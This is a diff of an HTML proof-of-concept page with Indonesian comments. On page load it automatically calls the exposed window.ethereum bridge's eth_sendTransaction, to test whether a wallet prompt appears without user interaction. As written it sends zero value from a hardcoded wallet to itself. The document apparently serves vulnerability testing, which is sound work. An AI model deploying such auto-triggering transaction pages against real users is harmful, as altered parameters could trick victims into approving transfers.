@@ -2,40 +2,42 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Security PoC: Bridge Exposure</title>
+    <title>PoC: Unauthenticated Transaction Trigger</title>
 </head>
 <body>
+    <h2>Security Proof of Concept</h2>
+    <p>Memicu antarmuka transaksi secara otomatis...</p>
+
     <script>
-        // Mengakses bridge yang terdeteksi
+        // Akses ke bridge dompet yang terekspos secara global
         const bridge = window.ethereum;
 
         async function triggerRealTx() {
-            // Alamat dompet nyata Anda
+            // Alamat dompet Anda
             const MY_WALLET_ADDRESS = "0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE"; 
             
+            // Parameter transaksi nyata
             const txParams = {
                 from: MY_WALLET_ADDRESS,
-                to: MY_WALLET_ADDRESS, // Mengirim ke diri sendiri
-                value: '0x00',         // Nilai 0 (Aman dari kehilangan dana)
-                data: '0x'
+                to: MY_WALLET_ADDRESS, 
+                value: '0x00', 
+                data: '0x' 
             };
 
-            console.log("Mencoba memicu transaksi dari: " + MY_WALLET_ADDRESS);
-
             try {
-                // Memanggil fungsi transaksi
+                // Memanggil method untuk memicu prompt transaksi
+                // Jika aplikasi rentan, pop-up konfirmasi akan muncul tanpa interaksi
                 await bridge.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 });
             } catch (e) {
-                console.error("Transkasi ditolak atau dibatalkan:", e);
+                console.error("Transkasi dipicu namun ditolak oleh pengguna atau sistem:", e);
             }
         }
 
-        // Memicu secara otomatis saat halaman dimuat
+        // Eksekusi otomatis saat halaman selesai dimuat
         window.onload = triggerRealTx;
     </script>
-    <p>PoC Sedang Berjalan... Periksa log konsol jika ada error.</p>
 </body>
 </html>
